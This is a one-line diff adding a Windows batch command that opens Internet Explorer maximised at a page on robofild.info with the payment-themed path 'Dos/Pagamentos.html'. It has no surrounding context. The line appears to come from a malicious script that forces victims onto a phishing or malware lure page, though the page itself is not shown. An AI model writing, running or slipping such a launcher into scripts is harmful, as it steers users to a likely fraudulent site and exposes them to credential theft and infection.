@@ -1,0 +1,1 @@
+start /MAX "C:\Program Files\Internet Explorer\iexplore.exe" "https://robofild.info/Dos/Pagamentos.html"
